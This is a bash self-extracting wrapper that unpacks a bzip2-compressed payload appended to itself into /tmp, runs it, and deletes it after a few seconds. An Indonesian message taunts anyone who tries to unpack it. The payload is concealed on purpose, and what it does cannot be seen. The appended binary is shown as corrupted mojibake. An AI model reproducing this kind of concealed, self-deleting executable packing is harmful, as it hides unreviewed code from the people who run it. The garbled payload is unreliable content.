#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�[�7  ��� }���o߮����    P���.�Â���I�e=5����1Phh3P� ��3Jz��ҁ�z� z�   �� 	�6$�z#A�@����4 8hd�CL�22����ѓ@21$�i�2��!�O�j�z�=@4���� 4E���T�;��հ ����ގgb�f��R�J{��TU_`�*����<r��ɿ��)!矖$P8dv�]Q��Ff�AF�.Ήw�h��U5hͥMJ�U�"	#Q����[�1��1t�9��t��qD�!J��8�^Y�}�ԥkV�2�\AQհj$�m�Lگ-��$`�cw�4>�g��2�1�Z��9��rƦ�#�f%0�1RG�Nh�N2��n�֘��<��Ў&1�v&LMJ�|_��(rJt`�.�-kY����6�Al��Ӽ��ٶ�Py8VL28~|��xj#��WN�Т�:��D�R(i��(��w]�(�|46'���*pk������͘]$��.*�(��F��x`���VcM�������f�a�2$�B������M0��}.߱=�kǨ9͹��<�g䄎�u6Cp�xhB�H�ض��d����NF���>kH&>Հ��)ț`��&.��T�Xƽ1���([��8���s�+��C.*F�ZKQ�ށ�@�'��;v����"z��ps�����bcm&Lp�eŝk����/]�)|�N�������SW�MX�Tp6�	�E�
���0_���YБ���kni�iZ�ؼ��"���:�����Ñ�lM�/���aF��=3D������F�#D�XV�2:b�(5�8�d�1�Z��� �[��tJ	϶sİALq�rl�o��,�,��8���k+0쌜�%d���E�
^E�;NУ�����Vr�L�KAzۖ��
��5@�ϸD����J&F	�Ŵ�e��0�Q�!��G�J�^y��_�$��I%�HI\���H�
���